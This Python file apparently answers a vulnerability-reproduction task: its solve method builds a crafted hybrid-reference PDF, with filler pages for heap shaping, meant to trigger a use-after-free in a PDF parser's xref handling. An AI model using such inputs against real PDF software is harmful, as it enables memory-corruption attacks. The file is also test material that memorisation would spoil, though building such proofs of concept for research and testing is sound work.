import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a use-after-free on a `pdf_xref_entry` pointer. This happens
        when such a pointer is held across a call that can cause the cross-reference
        table to be reallocated (an operation called "solidification" or "repair").
        
        The PoC exploits the recursive nature of `pdf_cache_object` when dealing with
        object streams. The trigger sequence is as follows:
        
        1. An outer call to `pdf_cache_object` is made for an object that resides
           inside an object stream (let's call it ObjA, inside ObjStmB).
        
        2. Inside this call, a pointer to ObjA's xref entry is obtained. This entry
           indicates that ObjA is in a stream and points to the stream object (ObjStmB).
           
        3. To extract ObjA, the function makes a recursive call to `pdf_load_object`
           to load the stream object, ObjStmB.
           
        4. Crucially, the loading of ObjStmB is crafted to trigger an xref solidification.
           This is achieved by structuring the PDF as a hybrid-reference file, where
           ObjStmB is defined in a secondary XRef stream. A lazy parser might only
           process this secondary stream when an object from it is first requested.
           This processing involves merging/solidifying the xref tables.
           
        5. The solidification reallocates the main xref table, freeing the memory that
           the original `pdf_xref_entry` pointer (for ObjA) was pointing to. This
           pointer is now dangling.
           
        6. When the recursive call for ObjStmB returns, the outer `pdf_cache_object`
           resumes execution. It then attempts to use the dangling pointer to access
           information about ObjA (e.g., its index within the stream), leading to a
           use-after-free.
           
        The PoC is structured as a hybrid-reference PDF with many filler objects to
        ensure the initial xref table allocation is large, increasing the likelihood
        that a reallocation will move it to a new memory address.
        """
        
        def format_obj(num, data):
            return b"%d 0 obj\n%b\nendobj\n" % (num, data)

        N_FILLER = 160  # Number of filler objects to control heap layout

        poc_parts = []
        poc_parts.append(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")

        offsets = {}
        current_offset = len(b"".join(poc_parts))

        # --- Define object contents ---
        obj_data = {}
        # Root -> Pages -> Page array
        obj_data[1] = b"<< /Type /Catalog /Pages 2 0 R >>"
        
        kids_array = b""
        # We need a trigger page and many filler pages.
        # Let's make page 3 the trigger.
        kids_array += b"3 0 R "
        for i in range(4, N_FILLER + 3):
            kids_array += b"%d 0 R " % i
        obj_data[2] = b"<< /Type /Pages /Count %d /Kids [ %b ] >>" % (N_FILLER, kids_array)
        
        # The trigger object is a Page (obj 3). It references an object that is
        # defined within an object stream. This will start the vulnerable call chain.
        # Object N_FILLER + 4 will be in the stream.
        obj_data[3] = b"<< /Type /Page /Parent 2 0 R /Annots [ %d 0 R ] >>" % (N_FILLER + 4)
        
        # Filler pages
        for i in range(4, N_FILLER + 3):
            obj_data[i] = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] >>"

        # --- Append objects that will be in the main xref table ---
        for i in sorted(obj_data.keys()):
            obj_full = format_obj(i, obj_data[i])
            offsets[i] = current_offset
            poc_parts.append(obj_full)
            current_offset += len(obj_full)

        # --- Define objects that will be in the secondary XRef Stream ---
        # Obj N_FILLER + 3: The Object Stream itself.
        # Obj N_FILLER + 4: The object inside the stream, referenced by obj 3.
        # Obj N_FILLER + 5: The XRef stream object.
        
        obj_stm_num = N_FILLER + 3
        in_stm_obj_num = N_FILLER + 4
        xref_stm_num = N_FILLER + 5

        # Define the object stream's content
        in_stm_obj_content = b"<</Type/Annot/Subtype/Text/Rect[0 0 10 10]>>"
        obj_stream_header = f"{in_stm_obj_num} 0".encode()
        obj_stream_uncompressed = obj_stream_header + b" " + in_stm_obj_content
        obj_stream_compressed = zlib.compress(obj_stream_uncompressed)
        
        obj_stm_data = b"<< /Type /ObjStm /N 1 /First %d /Filter /FlateDecode /Length %d >>\nstream\n%b\nendstream" % (
            len(obj_stream_header) + 1,
            len(obj_stream_compressed),
            obj_stream_compressed
        )
        obj_stm_full = format_obj(obj_stm_num, obj_stm_data)

        # Define the XRef stream's content (uncompressed for predictable offsets)
        # First, calculate the offsets of the objects that will follow.
        offsets[obj_stm_num] = current_offset
        offsets[xref_stm_num] = offsets[obj_stm_num] + len(obj_stm_full)

        # Create the xref data for the stream. /W [1 4 2] -> 7 bytes per entry.
        # This stream defines objects from obj_stm_num to xref_stm_num.
        xref_stream_entries = b""
        # Entry for obj_stm_num (type 'n' - normal object)
        xref_stream_entries += b"\x01" + offsets[obj_stm_num].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        # Entry for in_stm_obj_num (type 'o' - in object stream)
        # Field 2 is the object number of the stream; Field 3 is the index within it.
        xref_stream_entries += b"\x02" + (obj_stm_num).to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        # Entry for xref_stm_num itself (type 'n')
        xref_stream_entries += b"\x01" + offsets[xref_stm_num].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        
        xref_stm_dict = b"<< /Type /XRef /Size %d /W [1 4 2] /Root 1 0 R /Index [ %d 3 ] /Length %d >>" % (
            xref_stm_num + 1,
            obj_stm_num,
            len(xref_stream_entries)
        )
        xref_stm_data = b"%b\nstream\n%b\nendstream" % (xref_stm_dict, xref_stream_entries)
        xref_stm_full = format_obj(xref_stm_num, xref_stm_data)
        
        # --- Append the 'new' objects that are part of the hybrid section ---
        poc_parts.append(obj_stm_full)
        current_offset += len(obj_stm_full)
        poc_parts.append(xref_stm_full)
        current_offset += len(xref_stm_full)

        # --- Main (first) XRef Table and Trailer ---
        xref1_offset = current_offset
        poc_parts.append(b"xref\n")
        
        # This main table only knows about objects up to N_FILLER+2.
        # The reference from obj 3 to N_FILLER+4 is what forces the parser
        # to consult the XRef stream declared in the trailer.
        num_main_objs = N_FILLER + 3
        poc_parts.append(b"0 %d\n" % num_main_objs)
        poc_parts.append(b"0000000000 65535 f \n")
        for i in range(1, num_main_objs):
            poc_parts.append(b"%010d 00000 n \n" % offsets[i])
        current_offset += len(b"".join(poc_parts[-(num_main_objs+1):]))

        # The trailer for the main xref table. It points to the XRef stream,
        # making this a hybrid-reference file.
        trailer = b"trailer\n<< /Size %d /Root 1 0 R /XRefStm %d >>\n" % (
            xref_stm_num + 1,
            offsets[xref_stm_num]
        )
        poc_parts.append(trailer)
        
        poc_parts.append(b"startxref\n%d\n" % xref1_offset)
        poc_parts.append(b"%%EOF\n")

        return b"".join(poc_parts)